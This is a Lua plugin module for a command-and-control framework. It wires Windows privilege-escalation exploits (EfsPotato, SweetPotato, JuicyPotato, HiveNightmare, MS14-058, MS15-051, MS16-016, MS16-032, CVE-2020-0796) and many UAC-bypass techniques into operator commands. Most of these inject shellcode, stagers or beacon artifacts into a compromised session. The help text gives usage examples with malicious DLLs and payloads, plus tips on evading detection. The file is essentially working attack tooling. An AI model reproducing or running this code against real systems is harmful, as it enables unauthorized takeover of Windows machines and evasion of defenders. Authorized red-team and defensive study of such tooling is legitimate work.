-- Privilege Escalation Module
-- Integrated from community-elevate plugin
-- References:
-- 1. https://github.com/rsmudge/ElevateKit
-- 2. https://github.com/icyguider/UAC-BOF-Bonanza

local function new_sac()
    local sac = new_sacrifice(0, false, false, false, "")
    return sac
end

local function bof_path_elevate(category, bof_name)
    return "elevate/" .. category .. "/" .. bof_name .. "/" .. bof_name .. ".o"
end

local function elevate_resource_path(category, filename)
    return "elevate/" .. category .. "/" .. filename
end

-- Unified shellcode retrieval function
-- Supports three modes: stager (default), shellcode_file, artifact_id
local function get_shellcode(session, cmd)
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local artifact_id = cmd:Flags():GetString("artifact_id")

    -- Priority: artifact_id > shellcode_file > stager (default)
    if artifact_id ~= "" then
        -- Get artifact by name
        local artifact, err = download_artifact(artifact_id, "raw", "")
        if err ~= nil or artifact == nil then
            error("Failed to get artifact with id: " .. artifact_id .. ", error: " .. tostring(err))
        end
        -- artifact.bin is already a byte string (decoded from protobuf)
        return artifact.bin
    elseif shellcode_file ~= "" then
        -- Read from file
        local shellcode_handle = io.open(shellcode_file, "rb")
        if shellcode_handle == nil then
            error("Failed to open shellcode file: " .. shellcode_file)
        end
        local shellcode = shellcode_handle:read("*all")
        shellcode_handle:close()
        return shellcode
    else
        -- Default: use self_stager
        return self_stager(session)
    end
end

-- EfsPotato_Net3.5.exe - Command execution
local function run_EfsPotato_Net35_Command(args)
    if #args < 1 then error("Usage: EfsPotato_Net3.5 <cmd>") end
    local session = active()
    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net3.5.exe")
    return execute_assembly(session, script_resource(efspotato_path), args, true,new_bypass_all(), new_sac())
end

local cmd_EfsPotato_Net35_Command = command("elevate:EfsPotato_Net3.5_Command", run_EfsPotato_Net35_Command,
        "EfsPotato privilege escalation with command execution", "T1068")
opsec("elevate:EfsPotato_Net3.5_Command", 8.0)

-- EfsPotato_Net3.5_CS.exe - Shellcode execution
local function run_EfsPotato_Net35_Shellcode(cmd)
    local session = active()
    local shellcode = get_shellcode(session, cmd)

    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net3.5_CS.exe")
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(efspotato_path), {b64_shellcode}, true,new_bypass_all(), new_sac())
end

local cmd_EfsPotato_Net35_Shellcode = command("elevate:EfsPotato_Net3.5_Shellcode", run_EfsPotato_Net35_Shellcode,
        "EfsPotato privilege escalation with shellcode execution", "T1068")
cmd_EfsPotato_Net35_Shellcode:Flags():String("shellcode_file", "",
        "Path to the raw shellcode file. If not set, uses self_stager")
cmd_EfsPotato_Net35_Shellcode:Flags():String("artifact_id", "",
        "Artifact ID to use for shellcode. If set, uses artifact instead of stager")
bind_flags_completer(cmd_EfsPotato_Net35_Shellcode, { artifact_id = artifact_completer() })
opsec("elevate:EfsPotato_Net3.5_Shellcode", 8.0)

help("elevate:EfsPotato_Net3.5_Shellcode", [[
EfsPotato .NET 3.5 privilege escalation with shellcode execution.

Examples:
  elevate EfsPotato_Net3.5_Shellcode                                    # Use self_stager (default)
  elevate EfsPotato_Net3.5_Shellcode --shellcode_file /path/to/sc.bin  # Use custom shellcode file
  elevate EfsPotato_Net3.5_Shellcode --artifact_id beacon_x64          # Use artifact from server

Options:
  --shellcode_file: Path to raw shellcode file (optional)
  --artifact_id: Artifact name to use for shellcode (optional)

  If no options specified, uses self_stager by default.
  Priority: artifact_id > shellcode_file > stager

Note: Exploits the MS-EFSR protocol for privilege escalation.
]])

-- EfsPotato_Net4.0.exe - Command execution
local function run_EfsPotato_Net40_Command(args)
    if #args ~= 1 then error("Usage: EfsPotato_Net4.0 <cmd>") end
    local session = active()
    local efspotato_path = elevate_resource_path("potato", "EfsPotato_Net4.0.exe")
    return execute_assembly(session, script_resource(efspotato_path), args, true,new_bypass_all(), new_sac())
end

local cmd_EfsPotato_Net40_Command = command("elevate:EfsPotato_Net4.0_Command", run_EfsPotato_Net40_Command,
        "EfsPotato .NET 4.0 privilege escalation with command execution", "T1068")
opsec("elevate:EfsPotato_Net4.0_Command", 8.0)

-- SweetPotato_NET4-46.exe
local function run_SweetPotato_NET46(args)
    if #args < 1 then error("Arguments required for SweetPotato") end
    local session = active()
    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_NET4-46.exe")
    return execute_assembly(session, script_resource(sweetpotato_path), args, true,new_bypass_all(), new_sac())
end

local cmd_SweetPotato_NET46 = command("elevate:SweetPotato4-46", run_SweetPotato_NET46, 
        "SweetPotato .NET 4.6 privilege escalation", "T1068")
opsec("elevate:SweetPotato4-46", 8.0)

-- SweetPotato_net4.0.exe
local function run_SweetPotato_Net40(args)
    if #args < 1 then error("Arguments required for SweetPotato") end
    local session = active()
    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_net4.0.exe")
    return execute_assembly(session, script_resource(sweetpotato_path), args, true,new_bypass_all(), new_sac())
end

local cmd_SweetPotato_Net40 = command("elevate:SweetPotato_net4.0", run_SweetPotato_Net40,
        "SweetPotato .NET 4.0 privilege escalation", "T1068")
opsec("elevate:SweetPotato_net4.0", 8.0)

-- SweetPotato_CS.exe - Shellcode execution
local function run_SweetPotato_CS(cmd)
    local session = active()
    local shellcode = get_shellcode(session, cmd)

    local sweetpotato_path = elevate_resource_path("potato", "SweetPotato_CS.exe")
    local b64_shellcode = base64_encode(shellcode)
    print(b64_shellcode)
    local args = {"-l", "12333", "-p", "c:\\windows\\system32\\cmd.exe", "-s", b64_shellcode}
    return execute_assembly(session, script_resource(sweetpotato_path), args, true, new_bypass_all(), new_sac())
end

local cmd_SweetPotato_CS = command("elevate:SweetPotato_CS", run_SweetPotato_CS,
        "SweetPotato privilege escalation with shellcode execution", "T1068")
cmd_SweetPotato_CS:Flags():String("shellcode_file", "",
        "Path to the raw shellcode file. If not set, uses self_stager")
cmd_SweetPotato_CS:Flags():String("artifact_id", "",
        "Artifact ID to use for shellcode. If set, uses artifact instead of stager")
bind_flags_completer(cmd_SweetPotato_CS, { artifact_id = artifact_completer() })
opsec("elevate:SweetPotato_CS", 8.0)

-- JuicyPotato
local function run_JuicyPotato(args, cmd)
    local session = active()
    local arch = session.Os.Arch
    
    -- Get parameters from flags
    local create_type = cmd:Flags():GetString("type")
    local program = cmd:Flags():GetString("program")
    local port = cmd:Flags():GetString("port")
    local clsid = cmd:Flags():GetString("clsid")
    local arguments = cmd:Flags():GetString("arguments")
    
    -- Build arguments array
    local jp_args = {}
    
    if create_type ~= "" then
        table.insert(jp_args, "-t")
        table.insert(jp_args, create_type)
    end
    
    if program ~= "" then
        table.insert(jp_args, "-p")
        table.insert(jp_args, program)
    end
    
    if port ~= "" then
        table.insert(jp_args, "-l")
        table.insert(jp_args, port)
    end
    
    if clsid ~= "" then
        table.insert(jp_args, "-c")
        table.insert(jp_args, clsid)
    end
    
    if arguments ~= "" then
        table.insert(jp_args, "-a")
        table.insert(jp_args, arguments)
    end
    
    local juicypotato_path = elevate_resource_path("potato", "JuicyPotato.exe")
    return execute_exe(session, script_resource(juicypotato_path), jp_args, true, 60, arch, "", new_sac())
end

local cmd_JuicyPotato = command("elevate:JuicyPotato", run_JuicyPotato, 
        "JuicyPotato privilege escalation", "T1068")
cmd_JuicyPotato:Flags():String("type", "t", "CreateProcess call type (t=CreateProcessWithTokenW, u=CreateProcessAsUser, *=auto)")
cmd_JuicyPotato:Flags():String("program", "c:\\windows\\system32\\cmd.exe", "Program to launch")
cmd_JuicyPotato:Flags():String("port", "1337", "COM server listening port")
cmd_JuicyPotato:Flags():String("clsid", "{8BC3F05E-D86B-11D0-A075-00C04FB68820}", "CLSID to use for COM object")
cmd_JuicyPotato:Flags():String("arguments", "", "Arguments to pass to the program")
opsec("elevate:JuicyPotato", 8.0)

help("elevate:JuicyPotato", [[
JuicyPotato privilege escalation tool with Tab completion support.

Flag-based usage (recommended):
  elevate JuicyPotato --type t --program "C:\Windows\Temp\malefic-demo.exe" --port  1116 --clsid {8BC3F05E-D86B-11D0-A075-00C04FB68820}

Parameters:
  --type: CreateProcess call type
    * t = CreateProcessWithTokenW (default)
    * u = CreateProcessAsUser  
    * * = auto-detect
  --program: Program to launch (default: "c:\windows\system32\cmd.exe")
  --port: COM server listening port (default: 1337)
  --clsid: CLSID to use for COM object (default: {8BC3F05E-D86B-11D0-A075-00C04FB68820})
  --arguments: Arguments to pass to the launched program

Common CLSIDs:
  - {8BC3F05E-D86B-11D0-A075-00C04FB68820} (BITS)
  - {BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6} (Windows Media Player)
  - {03ca98d6-ff5d-49b8-abc6-03dd84127020} (Automatic Proxy Configuration)

Note: Requires specific Windows versions and CLSID compatibility.
OPSEC consideration: Use different ports and CLSIDs to avoid detection.
]])

-- =============================================================================
-- HIVENIGHTMARE SERIES
-- =============================================================================

-- SharpHiveNightmare_Net4.0.exe
local function run_SharpHiveNightmare_Net40()
    local session = active()
    local sharphivenightmare_path = elevate_resource_path("hivenightmare", "SharpHiveNightmare_Net4.exe")
    return execute_assembly(session, script_resource(sharphivenightmare_path), {}, true, new_bypass_all(), new_sac())
end

local cmd_SharpHiveNightmare_Net40 = command("elevate:SharpHiveNightmare_Net4.0", run_SharpHiveNightmare_Net40,
        "SharpHiveNightmare .NET 4.0 privilege escalation", "T1068")
opsec("elevate:SharpHiveNightmare_Net4.0", 9.0)

-- SharpHiveNightmare_Net4.5.exe
local function run_SharpHiveNightmare_Net45()
    local session = active()
    local sharphivenightmare_path = elevate_resource_path("hivenightmare", "SharpHiveNightmare_Net4.5.exe")
    return execute_assembly(session, script_resource(sharphivenightmare_path), {}, true, new_bypass_all(), new_sac())
end

local cmd_SharpHiveNightmare_Net45 = command("elevate:SharpHiveNightmare_Net4.5", run_SharpHiveNightmare_Net45,
        "SharpHiveNightmare .NET 4.5 privilege escalation", "T1068")
opsec("elevate:SharpHiveNightmare_Net4.5", 9.0)

-- HiveNightmare.exe
local function run_HiveNightmare()
    local session = active()
    local hivenightmare_path = elevate_resource_path("hivenightmare", "HiveNightmare.exe")
    return execute_exe(session, script_resource(hivenightmare_path), {}, true, 60, session.Os.Arch, "", new_sac())
end

local cmd_HiveNightmare = command("elevate:HiveNightmare", run_HiveNightmare,
        "HiveNightmare privilege escalation", "T1068")
opsec("elevate:HiveNightmare", 9.0)

-- =============================================================================
-- CVE EXPLOITS (ELEVATEKIT)
-- =============================================================================

-- ms14-058 (CVE-2014-4113)
local function run_ms14_058(args, cmd)
    local session = active()
    local arch = session.Os.Arch
    local shellcode = get_shellcode(session, cmd)

    local dllpath = script_resource(elevate_resource_path("ms14_058", "cve-2014-4113." .. arch .. ".dll"))
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "", new_sac())
end

local cmd_ms14_058 = command("elevate:ms14-058", run_ms14_058,
        "MS14-058 (CVE-2014-4113) privilege escalation", "T1068")
cmd_ms14_058:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
cmd_ms14_058:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
bind_flags_completer(cmd_ms14_058, { artifact_id = artifact_completer() })
opsec("elevate:ms14-058", 7.0)

help("elevate:ms14-058", [[
MS14-058 (CVE-2014-4113) kernel privilege escalation exploit.

Examples:
  elevate ms14-058                                    # Use self_stager (default)
  elevate ms14-058 --shellcode_file C:\payload.bin    # Use custom shellcode file
  elevate ms14-058 --artifact_id beacon_x64           # Use artifact from server

Options:
  --shellcode_file: Path to raw shellcode file (optional)
  --artifact_id: Artifact name to use for shellcode (optional)

  If no options specified, uses self_stager by default.
  Priority: artifact_id > shellcode_file > stager

Affected Systems:
  - Windows 7 SP1
  - Windows 8.1
  - Windows Server 2008 R2 SP1
  - Windows Server 2012/2012 R2

Note: This exploit targets a vulnerability in win32k.sys.
Supports both x86 and x64 architectures.
]])

-- ms15-051 (CVE-2015-1701)
local function run_ms15_051(args, cmd)
    local session = active()
    local arch = session.Os.Arch
    local shellcode = get_shellcode(session, cmd)

    local dllpath = script_resource(elevate_resource_path("ms15_051", "cve-2015-1701." .. arch .. ".dll"))
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "", new_sac())
end

local cmd_ms15_051 = command("elevate:ms15-051", run_ms15_051,
        "MS15-051 (CVE-2015-1701) privilege escalation", "T1068")
cmd_ms15_051:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
cmd_ms15_051:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
bind_flags_completer(cmd_ms15_051, { artifact_id = artifact_completer() })
opsec("elevate:ms15-051", 7.0)

help("elevate:ms15-051", [[
MS15-051 (CVE-2015-1701) kernel privilege escalation exploit.

Examples:
  elevate ms15-051                                    # Use self_stager (default)
  elevate ms15-051 --shellcode_file C:\payload.bin    # Use custom shellcode file
  elevate ms15-051 --artifact_id beacon_x64           # Use artifact from server

Options:
  --shellcode_file: Path to raw shellcode file (optional)
  --artifact_id: Artifact name to use for shellcode (optional)

  If no options specified, uses self_stager by default.
  Priority: artifact_id > shellcode_file > stager

Affected Systems:
  - Windows 7 SP1
  - Windows 8.1
  - Windows Server 2008 R2 SP1
  - Windows Server 2012/2012 R2

Note: This exploit targets a vulnerability in the Windows kernel (win32k.sys).
Supports both x86 and x64 architectures.
]])

-- ms16-016 (CVE-2016-0051) - x86 only
local function run_ms16_016(args, cmd)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x64" then
        error("MS16-016 exploit is x86 only")
        return
    end

    local shellcode = get_shellcode(session, cmd)
    local dllpath = script_resource(elevate_resource_path("dll", "cve-2016-0051." .. arch .. ".dll"))
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "", new_sac())
end

local cmd_ms16_016 = command("elevate:ms16-016", run_ms16_016,
        "MS16-016 (CVE-2016-0051) privilege escalation (x86 only)", "T1068")
cmd_ms16_016:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
cmd_ms16_016:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
bind_flags_completer(cmd_ms16_016, { artifact_id = artifact_completer() })
opsec("elevate:ms16-016", 7.0)

help("elevate:ms16-016", [[
MS16-016 (CVE-2016-0051) kernel privilege escalation exploit.

Examples:
  elevate ms16-016                                    # Use self_stager (default)
  elevate ms16-016 --shellcode_file C:\payload.bin    # Use custom shellcode file
  elevate ms16-016 --artifact_id beacon_x86           # Use artifact from server

Options:
  --shellcode_file: Path to raw shellcode file (optional)
  --artifact_id: Artifact name to use for shellcode (optional)

  If no options specified, uses self_stager by default.
  Priority: artifact_id > shellcode_file > stager

Requirements:
  - x86 architecture ONLY (will fail on x64 systems)

Affected Systems:
  - Windows Vista SP2 (x86)
  - Windows 7 SP1 (x86)
  - Windows 8.1 (x86)
  - Windows Server 2008 SP2 (x86)
  - Windows Server 2008 R2 SP1 (x86)
  - Windows Server 2012/2012 R2 (x86)

Note: This exploit targets a vulnerability in WebDAV client (mrxdav.sys).
]])

-- ms16-032 PowerShell exploit
local function run_ms16_032(args)
    local session = active()
    local script_path = elevate_resource_path("scripts", "Invoke-MS16032.ps1")
    local script_handle = io.open(script_resource(script_path), "r")
    if script_handle == nil then
        error("Failed to read PowerShell script: " .. script_path)
    end
    local script_content = script_handle:read("*all")
    script_handle:close()
    
    -- Use powershell command execution instead of import
    local ps_command = script_content .. "; Invoke-MS16032"
    if #args > 0 then
        ps_command = ps_command .. " " .. table.concat(args, " ")
    end
    
    return powershell(session, ps_command, false)
end

local cmd_ms16_032 = command("elevate:ms16-032", run_ms16_032,
        "MS16-032 PowerShell privilege escalation", "T1068")
opsec("elevate:ms16-032", 8.0)

-- cve-2020-0796 (SMBGhost)
local function run_cve_2020_0796(args, cmd)
    local session = active()
    local arch = session.Os.Arch
    if arch ~= "x64" then
        error("CVE-2020-0796 exploit requires x64 architecture")
        return
    end

    local shellcode = get_shellcode(session, cmd)
    local dllpath = script_resource(elevate_resource_path("cve-2020-0796", "cve-2020-0796." .. arch .. ".dll"))
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "", new_sac())
end

local cmd_cve_2020_0796 = command("elevate:cve-2020-0796", run_cve_2020_0796,
        "CVE-2020-0796 (SMBGhost) privilege escalation", "T1068")
cmd_cve_2020_0796:Flags():String("shellcode_file", "", "Path to raw shellcode file (optional, uses self_stager if not provided)")
cmd_cve_2020_0796:Flags():String("artifact_id", "", "Artifact ID to use for shellcode (optional)")
bind_flags_completer(cmd_cve_2020_0796, { artifact_id = artifact_completer() })
opsec("elevate:cve-2020-0796", 7.0)

help("elevate:cve-2020-0796", [[
CVE-2020-0796 (SMBGhost) privilege escalation exploit.

Examples:
  elevate cve-2020-0796                               # Use self_stager (default)
  elevate cve-2020-0796 --shellcode_file C:\payload.bin # Use custom shellcode file
  elevate cve-2020-0796 --artifact_id beacon_x64      # Use artifact from server

Options:
  --shellcode_file: Path to raw shellcode file (optional)
  --artifact_id: Artifact name to use for shellcode (optional)

  If no options specified, uses self_stager by default.
  Priority: artifact_id > shellcode_file > stager

Requirements:
  - x64 architecture ONLY
  - Windows 10 version 1903/1909 with vulnerable SMBv3 compression

Affected Systems:
  - Windows 10 Version 1903 (April 2019 Update)
  - Windows 10 Version 1909 (November 2019 Update)
  - Windows Server Version 1903
  - Windows Server Version 1909

Note: This exploit targets the SMBv3 compression vulnerability in srv2.sys.
Requires local access and SMBv3 compression enabled.
]])

-- =============================================================================
-- UAC BYPASS TECHNIQUES
-- =============================================================================

-- TrustedPath DLL Hijack
local function run_trustedpath(cmd)
    local local_dll = cmd:Flags():GetString("local_dll_file")
    if local_dll == "" then
        error("local_dll_file is required")
        return
    end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file = bof_path_elevate("bof","TrustedPathDLLHijack")
    local file_content_handle = io.open(local_dll, "rb")
    if file_content_handle == nil then 
        error("Failed to open DLL file: " .. local_dll) 
    end
    
    local file_content = file_content_handle:read("*all")
    file_content_handle:close()
    local content_len = string.len(file_content)
    local pack_args = bof_pack("iz", content_len, file_content)
    
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_trustedpath = command("uac-bypass:trustedpath", run_trustedpath,
        "UAC bypass via fake windows directory with ComputerDefaults.exe and Secur32.dll", "T1068")
cmd_trustedpath:Flags():String("local_dll_file", "", "Full path to the DLL file to be executed")
opsec("uac-bypass:trustedpath", 8.5)

help("uac-bypass:trustedpath", [[
UAC bypass via fake Windows directory with ComputerDefaults.exe and Secur32.dll hijacking.

Examples:
  uac-bypass trustedpath --local_dll_file C:\path\to\your\malicious.dll

Requirements:
  - x64 architecture only
  - Valid DLL file for hijacking
  - Windows 10/11 compatibility

This technique creates a fake Windows directory structure and hijacks the Secur32.dll
loaded by ComputerDefaults.exe to bypass UAC.
]])

-- CmstpElevatedCOM
local function run_CmstpElevatedCOM(args)
    if #args < 1 then error("Command argument required") end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file = bof_path_elevate("bof","CmstpElevatedCOM")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_CmstpElevatedCOM = command("uac-bypass:elevatedcom", run_CmstpElevatedCOM,
        "UAC bypass using CmstpElevatedCOM technique", "T1068")
opsec("uac-bypass:elevatedcom", 8.5)

-- ColorDataProxy UAC Bypass
local function run_ColorDataProxy(args)
    if #args < 1 then error("Command argument required") end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file = bof_path_elevate("bof","ColorDataProxy")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_ColorDataProxy = command("uac-bypass:colordataproxy", run_ColorDataProxy,
        "UAC bypass using ColorDataProxy technique", "T1068")
opsec("uac-bypass:colordataproxy", 8.5)

-- EditionUpgradeManager UAC Bypass
local function run_EditionUpgradeManager(cmd)
    local command_to_run = cmd:Flags():GetString("command")
    local use_disk_file = cmd:Flags():GetBool("use_disk_file")
    
    if command_to_run == "" then
        error("Command is required")
    end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file
    if use_disk_file then
        bof_file = bof_path_elevate("bof","EditionUpgradeManager_OnDiskFile")
    else
        bof_file = bof_path_elevate("bof","EditionUpgradeManager")
    end
    
    local pack_args = bof_pack("z", command_to_run)
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_EditionUpgradeManager = command("uac-bypass:editionupgrade", run_EditionUpgradeManager,
        "UAC bypass using EditionUpgradeManager technique", "T1068")
cmd_EditionUpgradeManager:Flags():String("command", "", "Command to execute with elevated privileges")
cmd_EditionUpgradeManager:Flags():Bool("use_disk_file", false, "Use on-disk file variant")
opsec("uac-bypass:editionupgrade", 8.5)

-- Registry Shell Command UAC Bypass
local function run_RegistryShellCommand(args)
    if #args < 1 then error("Command argument required") end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file = bof_path_elevate("bof","RegistryShellCommand")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_RegistryShellCommand = command("uac-bypass:registryshell", run_RegistryShellCommand,
        "UAC bypass using Registry Shell Command technique", "T1068")
opsec("uac-bypass:registryshell", 8.5)

-- SilentCleanupWinDir UAC Bypass
local function run_SilentCleanupWinDir(cmd)
    local command_to_run = cmd:Flags():GetString("command")
    local use_disk_file = cmd:Flags():GetBool("use_disk_file")
    
    if command_to_run == "" then
        error("Command is required")
    end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file
    if use_disk_file then
        bof_file = bof_path_elevate("bof","SilentCleanupWinDir_OnDiskFile")
    else
        bof_file = bof_path_elevate("bof","SilentCleanupWinDir")
    end
    
    local pack_args = bof_pack("z", command_to_run)
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_SilentCleanupWinDir = command("uac-bypass:silentcleanup", run_SilentCleanupWinDir,
        "UAC bypass using SilentCleanupWinDir technique", "T1068")
cmd_SilentCleanupWinDir:Flags():String("command", "", "Command to execute with elevated privileges")
cmd_SilentCleanupWinDir:Flags():Bool("use_disk_file", false, "Use on-disk file variant")
opsec("uac-bypass:silentcleanup", 8.5)

-- SspiUacBypass
local function run_SspiUacBypass(args)
    if #args < 1 then error("Command argument required") end
    
    local session = active()
    local arch = session.Os.Arch
    if arch == "x32" then
        error("x32 architecture not supported")
        return
    end
    
    local bof_file = bof_path_elevate("bof","SspiUacBypass")
    local pack_args = bof_pack("z", args[1])
    return bof(session, script_resource(bof_file), pack_args, true)
end

local cmd_SspiUacBypass = command("uac-bypass:sspi", run_SspiUacBypass,
        "UAC bypass using SSPI technique", "T1068")
opsec("uac-bypass:sspi", 8.5)

-- =============================================================================
-- POWERSHELL UAC BYPASSES
-- =============================================================================

-- EnvBypass PowerShell UAC bypass
local function run_EnvBypass(args)
    local session = active()
    local script_path = elevate_resource_path("invoke-env_bypass", "Invoke-EnvBypass.ps1")
    local script_content = read_resource(script_path)
    local ps_command = script_content .. "; Invoke-EnvBypass;"
    if #args > 0 then
        ps_command = ps_command .. " " .. table.concat(args, " ")
    end
    return powershell(session, ps_command, false)
end

local cmd_EnvBypass = command("uac-bypass:envbypass", run_EnvBypass,
        "UAC bypass using environment variable manipulation", "T1068")
opsec("uac-bypass:envbypass", 8.0)

-- EventVwr UAC bypass
local function run_EventVwrBypass(args)
    local session = active()
    local script_path = elevate_resource_path("invoke-event_vwr_bypass", "Invoke-EventVwrBypass.ps1")
    local script_content = read_resource(script_path)
    local ps_command = script_content .. "; Invoke-EventVwrBypass"
    if #args > 0 then
        ps_command = ps_command .. " " .. table.concat(args, " ")
    end
    
    return powershell(session, ps_command, false)
end

local cmd_EventVwrBypass = command("uac-bypass:eventvwr", run_EventVwrBypass,
        "UAC bypass using Event Viewer hijack", "T1068")
opsec("uac-bypass:eventvwr", 8.0)

-- WScript UAC bypass
local function run_WScriptBypass(args)
    local session = active()
    local script_path = elevate_resource_path("invoke-wscript_bypass", "Invoke-WScriptBypassUAC.ps1")
    local script_content = read_resource(script_path)
    local ps_command = script_content .. "; Invoke-WScriptBypassUAC"
    if #args > 0 then
        ps_command = ps_command .. " " .. table.concat(args, " ")
    end
    
    return powershell(session, ps_command, false)
end

local cmd_WScriptBypass = command("uac-bypass:wscript", run_WScriptBypass,
        "UAC bypass using WScript hijack", "T1068")
opsec("uac-bypass:wscript", 8.0)


